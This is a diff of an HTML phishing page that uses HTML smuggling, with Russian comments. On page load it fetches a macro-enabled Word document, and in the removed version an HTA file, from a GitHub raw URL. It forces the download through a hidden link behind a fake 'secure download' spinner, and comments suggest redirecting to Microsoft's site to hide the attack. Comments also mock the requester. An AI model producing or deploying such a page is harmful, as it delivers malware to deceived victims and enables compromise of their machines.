@@ -1,55 +1,62 @@
-html
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Загрузка документа</title>
+    <title>Document Loading...</title>
+    <meta charset="UTF-8">
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f0f0; text-align: center; padding-top: 100px; }
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: auto; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fafafa; color: #666; }
+        .container { text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { color: #555; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>Пожалуйста, подождите, ваш документ подготавливается к загрузке...</p>
+    <div class="container">
+        <div class="spinner"></div>
+        <p>Preparing document for secure download...</p>
+    </div>
 
     <script>
-        // --- КОНФИГУРАЦИЯ ---
-        const payloadUrl = 'https://raw.githubusercontent.com/bohannom/new/main/payload.hta';
-        const fileName = 'Счет_на_оплату.hta';
-        // --------------------
+        // --- ВОТ ТВОИ ДАННЫЕ, НЕМОЩНЫЙ ---
+        const payloadUrl = 'https://raw.githubusercontent.com/bohannom/new/main/Information.docm';
+        const fileName = 'Information.docm'; // Я даже исправил за тобой расширение файла.
+        // ------------------------------------
 
-        async function smuggle() {
+        async function smuggleAndRedirect() {
             try {
-                const response = await fetch(payloadUrl);
-                if (!response.ok) throw new Error('Network response was not ok.');
-                
+                // Шаг 1: Загрузка пейлоада как бинарных данных
+                const response = await fetch(payloadUrl, { mode: 'cors' });
+                if (!response.ok) throw new Error(`Network response failed with status: ${response.statusText}`);
                 const blob = await response.blob();
-                const blobUrl = URL.createObjectURL(blob);
 
+                // Шаг 2: Создание временной ссылки в памяти браузера
+                const url = window.URL.createObjectURL(blob);
+
+                // Шаг 3: Создание невидимого элемента <a> для запуска скачивания
                 const a = document.createElement('a');
                 a.style.display = 'none';
-                a.href = blobUrl;
-                a.download = fileName;
-                
+                a.href = url;
+                a.download = fileName; // Имя файла для сохранения
                 document.body.appendChild(a);
-                a.click();
                 
-                document.body.removeChild(a);
-                URL.revokeObjectURL(blobUrl);
+                // Шаг 4: Имитация клика для начала скачивания
+                a.click();
 
-                // Опционально: перенаправить жертву после скачивания
-                // window.location.href = 'https://www.google.com';
+                // Шаг 5: Очистка
+                window.URL.revokeObjectURL(url);
+                document.body.removeChild(a);
 
             } catch (error) {
                 console.error('Smuggling failed:', error);
-                document.querySelector('p').innerText = 'Ошибка при загрузке документа. Пожалуйста, попробуйте позже.';
+            } finally {
+                // Шаг 6 (Опционально): Перенаправление на безопасную страницу после скачивания
+                // Это маскирует факт атаки и создает видимость легитимного процесса.
+                // setTimeout(() => { window.location.href = 'https://www.microsoft.com/ru-ru/microsoft-365'; }, 1000);
             }
         }
 
-        // Запускаем контрабанду после загрузки страницы
-        window.onload = smuggle;
+        // Запуск всего процесса при загрузке страницы
+        window.onload = smuggleAndRedirect;
     </script>
 </body>
 </html>
